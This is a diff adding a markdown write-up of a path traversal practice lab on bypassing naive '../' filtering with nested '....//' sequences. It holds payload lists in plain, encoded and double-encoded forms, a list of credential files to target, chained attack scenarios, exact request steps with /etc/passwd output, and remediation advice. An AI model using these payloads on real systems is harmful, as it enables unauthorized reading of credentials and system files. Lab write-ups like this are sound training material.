@@ -325,3 +325,255 @@ Lab solved.
 This lab demonstrates how weak path traversal filters are easily bypassed using **absolute paths**, encoding tricks, and mixed traversal sequences. Reading `/etc/passwd` confirms the vulnerability and completes the lab.
 
 ---
+
+# 🔥Lab-3 Path Traversal – Filter Bypass (Nested Traversal)  
+## 🔹 One‑Line Summary  
+Bypass naive ../ filtering using nested traversal sequences like `....//` to escape directories and read sensitive system files such as `/etc/passwd`.
+
+---
+
+# ❓ What Is This Topic?
+
+**Path Traversal (Directory Traversal)** is a vulnerability where the application improperly handles user-supplied file paths.  
+Attackers manipulate paths using traversal sequences (`../`, `..\`, encoded forms, or obfuscated patterns) to break out of the intended directory and read arbitrary files from the server.
+
+This lab focuses on **filter bypass** using **nested traversal patterns** such as:
+
+```
+....//....//....//etc/passwd
+```
+
+---
+
+# 💡 Why This Matters
+
+Path Traversal is one of the most dangerous web vulnerabilities because it allows attackers to:
+
+- 🔓 Escape internal directories  
+- 📂 Read system files  
+- 🔐 Leak credentials  
+- 💾 Access config files  
+- 🧩 Steal cloud/API keys  
+- 🛠 Understand server-side code  
+- 🧨 Chain attacks into full RCE if file upload or writable folders exist  
+
+Even if developers implement filters, **naive sanitization is easy to bypass** with nested traversal like `....//`.
+
+---
+
+# 🌍 Real‑World Scenarios
+
+### **Scenario 1 — DB Credentials Theft**
+Read:
+```
+/var/www/html/config.php
+```
+→ Extract DB user/pass  
+→ Login to phpMyAdmin / internal panel  
+→ Account takeover
+
+---
+
+### **Scenario 2 — SSH Private Key Exfiltration**
+```
+../../../home/admin/.ssh/id_rsa
+```
+→ Private key stolen  
+→ Lateral movement inside network
+
+---
+
+### **Scenario 3 — Cloud Credentials Leak (.env)**
+```
+/home/www/.env
+```
+Contains:
+```
+AWS_ACCESS_KEY_ID=
+AWS_SECRET_ACCESS_KEY=
+```
+→ AWS account takeover
+
+---
+
+### **Scenario 4 — Writable Directory → RCE**
+1. Upload `.php`  
+2. Access it with traversal  
+3. Remote Code Execution achieved
+
+---
+
+### **Scenario 5 — Log Poisoning → Webshell**
+1. Inject PHP in User-Agent  
+2. Read logs using traversal  
+3. Logs execute → RCE  
+
+---
+
+### **Scenario 6 — Container Escape Enumeration**
+```
+/proc/self/cgroup  
+/proc/self/mounts
+```
+
+---
+
+### **Scenario 7 — JWT Secret Theft**
+```
+/var/www/html/.env
+```
+→ Forge admin JWT tokens → admin takeover
+
+---
+
+# 🧪 Common Nested Traversal Payloads
+
+### **Direct**
+```
+../../etc/passwd
+```
+
+### **Encoded**
+```
+..%2f..%2fetc%2fpasswd
+```
+
+### **Double Encoded**
+```
+%252e%252e%252f%252e%252e%252fetc%252fpasswd
+```
+
+### **Nested Filter Bypass (THIS LAB)**
+```
+....//....//....//etc/passwd
+```
+
+Developers often strip only simple patterns like:
+```
+../  
+..\
+```
+But `....//` becomes valid traversal *after* sanitization.
+
+---
+
+# 🎯 High‑Value Files to Target
+
+### **Linux**
+```
+/etc/passwd  
+/etc/shadow  
+/etc/hostname  
+/etc/hosts
+```
+
+### **Application**
+```
+config.php  
+.env  
+settings.py
+```
+
+### **Credentials**
+```
+/home/admin/.ssh/id_rsa  
+/root/.bash_history
+```
+
+### **Cloud**
+```
+~/.aws/credentials  
+/var/run/secrets/kubernetes.io/serviceaccount/token
+```
+
+---
+
+# 🔍 Methodology (Pentester Checklist)
+
+Whenever you see parameters like:
+
+```
+file=
+image=
+path=
+filename=
+download=
+```
+
+Test using levels:
+
+### ⭐ **Level 1 — Direct Traversal**
+```
+../../etc/passwd
+```
+
+### ⭐ **Level 2 — Encoded**
+```
+..%2f..%2fetc%2fpasswd
+```
+
+### ⭐ **Level 3 — Double Encoded**
+```
+%252e%252e%252f%252e%252e%252fetc%252fpasswd
+```
+
+### ⭐ **Level 4 — Filter Bypass (Nested Traversal)**
+```
+....//....//etc/passwd
+```
+
+---
+
+# 🧭 LAB WALKTHROUGH (Exact Steps)
+
+### **Step 1 — Identify the vulnerable parameter**
+```
+GET /image?filename=5.png
+```
+
+### **Step 2 — Send to Repeater**  
+Check server behavior.
+
+### **Step 3 — Try direct traversal**
+```
+filename=../../../etc/passwd
+```
+❌ Blocked — server removes `../`.
+
+### **Step 4 — Use nested traversal bypass**
+```
+filename=....//....//....//etc/passwd
+```
+
+### **Step 5 — Verify successful file read**  
+You receive `/etc/passwd` output:
+
+```
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+...
+```
+
+🎉 **Lab solved.**
+
+---
+
+# 📸 Evidence (Screenshot)
+
+![path traversal by nested action](../images/path-traversal-nested-bypass.png)
+
+---
+
+# 🛡 Remediation
+
+✔ Normalize all paths before usage  
+✔ Strict allowlist: only permit filenames like `^[a-zA-Z0-9._-]+$`  
+✔ NEVER concatenate raw input into file paths  
+✔ Block encoded/obfuscated traversal attempts  
+✔ Deny absolute paths (`/etc/passwd`)  
+✔ Use chroot jail or restricted FS permissions  
+✔ Run server as non‑privileged user  
+✔ Log abnormal file access attempts  
+
+---
